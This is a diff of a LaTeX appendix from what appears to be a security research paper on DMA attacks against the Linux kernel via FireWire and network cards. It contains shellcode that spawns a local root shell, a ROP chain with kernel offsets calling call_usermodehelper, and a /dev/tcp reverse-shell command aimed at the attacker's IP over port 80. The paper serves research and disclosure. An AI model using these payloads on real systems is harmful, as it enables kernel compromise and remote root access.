@@ -1,14 +1,11 @@
 \newpage
-\section{Shell Code}\label{apx:shellcode}
-To open the new shell, we used the built-in functionality the Linux kernel provides for spawning user processes with root privileges. This command opens a local shell.
 
+\section{Shell Code}\label{apx:shellcode}
+
+To open the new shell, we used the built-in functionality the Linux kernel that provides for spawning user processes with root privileges. This command opens a local shell.
 
 \textbf{\nobreak ``/sbin/getty -aroot tty9''}
-%The following command opens a remote shell on the attacker's machine.
 
-%This shellcode size is less than 100 bytes, which means that it fits into a single writable page. We used the same page where the initial attack took place, when possible. Finally, for all attacks, 
-%we validated that the shellcode was able to run when the computer is locked, successfully showing a gaining access scenario as well. 
-%We also implemented improved versions of this shellcode: We implemented a ROP payload based on this shellcode in order to bypass DEP protection. For the basic case, we implemented both the ROP and the regular version using fixed kernel pointers (e.g., function calls). When kASLR was enabled, we patched the payload during attack execution. Lastly, we replaced the string \textbf{\nobreak ``/sbin/getty -aroot tty9''}, which opens a local shell, with the string \textbf{\nobreak ``/bin/bash -c /bin/bash$>$\&/dev/tcp/{\normalfont \emph{attacker's IP}}/{\normalfont \emph{port}}$<$\&1''}, which opens a remote shell on the attacker's machine. We used port 80 (HTTP) in order to bypass firewalls, but any port could be used.
 \begin{figure}[h]
         \begin{verbatim}
 ;push ``/sbin/getty -aroot tty9''
@@ -39,17 +36,12 @@ ret
         \caption{Shellcode for spawning a new local root shell.}
         \label{fig:shellcode_1}
 \end{figure}
-In (Fig. \ref{fig:shellcode_2} we show a ROP attack, based on the same Linux functionality to open a remote shell on the attacker's machine.
 
 
-%\textbf{\nobreak ``/bin/bash -c /bin/bash$>$\&/dev/tcp/{\normalfont \emph{attacker's IP}}/{\normalfont \emph{port}}$<$\&1''},
-
-%We implemented ROP payloads based on the shellcode used in the basic case (\ref{fig:shellcode_1}), showing that DEP could not prevent the attack. Using the ROP gadget tool1\footnote{https://github.com/JonathanSalwan/ROPgadget}, we searched Linux kernel binaries for gadgets that together achieve the same logic as the original shellcode. When we implemented the attack, we took advantage
-%of the common practice of passing a ‘this’ pointer to a callback as the first parameter. According to the System V AMD64 ABI calling conventions (which Linux follows), the first parameter is passed in the rdi register, so the pivoting code can use it to find the new stack. Without it, we could not find the stack.
-%We implemented two different versions, one for FireWire and one for NICs (Fig \ref{fig:shellcode_2}), of the ROP payloads. One minor difference between the versions is that in the network cards case, we used a modified OS and hence the binary was different. The more important difference is that in the NICs case, the callback was not pointed directly from the writable structure but had another level of indirection. As a result, the attacker could choose the address of the structure holding the callback and control rdi. This is essential for payload spraying, because the stack lies in the sprayed page, which has an arbitrary address. In the FireWire case, rdi is always pointing to the attacked sbp2 management orb, forcing the stack to be in the same page.
-
-\begin{figure*}
-                \begin{lstlisting}[
+\clearpage
+section{Shell Code}\label{apx:shellcode}
+\begin{figure}[b]
+        \begin{lstlisting}[
         basicstyle = \scriptsize,
         columns = fullflexible,
         %frame = l,
@@ -116,7 +108,29 @@ page[0xFE8] = KERNEL_BASE + 0x0896a0; // &call_usermodehelper
 page[0xFF0] = KERNEL_BASE + 0x4c0f0e; // xor rax, rax ; ret
 page[0xFF8] = KERNEL_BASE + 0x003795; // leave ; ret
         \end{lstlisting}
+        %\vspace{-5mm}
         \caption{
-                The pivoting code uses the \texttt{rdi} register, which points to the \means{} page}
+                ROP attack, based on the same Linux functionality to open a remote shell on the attacker's machine. The pivoting code uses \texttt{rdi} register, which points to the \means{} page.}
         \label{fig:shellcode_2}
-\end{figure*}
+\end{figure}
+
+
+
+%The following command opens a remote shell on the attacker's machine.
+
+%This shellcode size is less than 100 bytes, which means that it fits into a single writable page. We used the same page where the initial attack took place, when possible. Finally, for all attacks, 
+%we validated that the shellcode was able to run when the computer is locked, successfully showing a gaining access scenario as well. 
+%We also implemented improved versions of this shellcode: We implemented a ROP payload based on this shellcode in order to bypass DEP protection. For the basic case, we implemented both the ROP and the regular version using fixed kernel pointers (e.g., function calls). When kASLR was enabled, we patched the payload during attack execution. Lastly, we replaced the string \textbf{\nobreak ``/sbin/getty -aroot tty9''}, which opens a local shell, with the string \textbf{\nobreak ``/bin/bash -c /bin/bash$>$\&/dev/tcp/{\normalfont \emph{attacker's IP}}/{\normalfont \emph{port}}$<$\&1''}, which opens a remote shell on the attacker's machine. We used port 80 (HTTP) in order to bypass firewalls, but any port could be used.
+
+
+%In (Fig. \ref{fig:shellcode_2} we show a ROP attack, based on the same Linux functionality to open a remote shell on the attacker's machine.
+
+%
+
+%\textbf{\nobreak ``/bin/bash -c /bin/bash$>$\&/dev/tcp/{\normalfont \emph{attacker's IP}}/{\normalfont \emph{port}}$<$\&1''},
+
+%We implemented ROP payloads based on the shellcode used in the basic case (\ref{fig:shellcode_1}), showing that DEP could not prevent the attack. Using the ROP gadget tool1\footnote{https://github.com/JonathanSalwan/ROPgadget}, we searched Linux kernel binaries for gadgets that together achieve the same logic as the original shellcode. When we implemented the attack, we took advantage
+%of the common practice of passing a ‘this’ pointer to a callback as the first parameter. According to the System V AMD64 ABI calling conventions (which Linux follows), the first parameter is passed in the rdi register, so the pivoting code can use it to find the new stack. Without it, we could not find the stack.
+%We implemented two different versions, one for FireWire and one for NICs (Fig \ref{fig:shellcode_2}), of the ROP payloads. One minor difference between the versions is that in the network cards case, we used a modified OS and hence the binary was different. The more important difference is that in the NICs case, the callback was not pointed directly from the writable structure but had another level of indirection. As a result, the attacker could choose the address of the structure holding the callback and control rdi. This is essential for payload spraying, because the stack lies in the sprayed page, which has an arbitrary address. In the FireWire case, rdi is always pointing to the attacked sbp2 management orb, forcing the stack to be in the same page.
+
+
